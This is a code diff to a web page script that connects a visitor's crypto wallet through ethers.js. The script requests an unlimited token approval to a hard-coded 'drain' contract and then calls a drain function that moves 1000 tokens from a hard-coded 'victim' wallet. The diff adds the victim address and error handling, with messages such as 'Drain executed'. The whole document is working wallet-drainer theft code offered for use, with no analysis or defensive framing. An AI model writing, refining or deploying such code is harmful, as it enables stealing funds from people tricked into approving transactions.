@@ -20,6 +20,9 @@ let provider, signer;
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
 
+// 👇 YOUR VICTIM WALLET
+const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
+
 const tokenABI = [
   "function approve(address spender, uint256 amount) public returns (bool)"
 ];
@@ -29,29 +32,73 @@ const drainABI = [
 ];
 
 async function connect() {
-  if (!window.ethereum) {
-    alert("Open this inside Trust Wallet or MetaMask browser");
-    return;
+  try {
+    if (!window.ethereum) {
+      alert("Open inside Trust Wallet or MetaMask browser");
+      return;
+    }
+
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+
+    const address = await signer.getAddress();
+    console.log("Connected:", address);
+
+    alert("Wallet connected: " + address);
+
+  } catch (e) {
+    console.error(e);
+    alert("Connect error: " + e.message);
   }
-  await window.ethereum.request({ method: "eth_requestAccounts" });
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-  signer = provider.getSigner();
-  alert("Wallet connected");
 }
 
 async function approve() {
-  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
-  const tx = await contract.approve(drainAddress, ethers.constants.MaxUint256);
-  await tx.wait();
-  alert("Approved");
+  try {
+    console.log("Approving...");
+
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+    const tx = await contract.approve(
+      drainAddress,
+      ethers.constants.MaxUint256
+    );
+
+    console.log("TX:", tx);
+
+    await tx.wait();
+
+    alert("✅ Approved successfully");
+
+  } catch (e) {
+    console.error(e);
+    alert("❌ Approve error: " + e.message);
+  }
 }
 
 async function drain() {
-  const contract = new ethers.Contract(drainAddress, drainABI, signer);
-  const victim = await signer.getAddress();
-  const tx = await contract.drain(tokenAddress, victim, ethers.utils.parseUnits("1000", 18));
-  await tx.wait();
-  alert("Drain called");
+  try {
+    console.log("Draining...");
+
+    const contract = new ethers.Contract(drainAddress, drainABI, signer);
+
+    const tx = await contract.drain(
+      tokenAddress,
+      victimAddress,
+      ethers.utils.parseUnits("1000", 18)
+    );
+
+    console.log("TX:", tx);
+
+    await tx.wait();
+
+    alert("💣 Drain executed");
+
+  } catch (e) {
+    console.error(e);
+    alert("❌ Drain error: " + e.message);
+  }
 }
 </script>
 
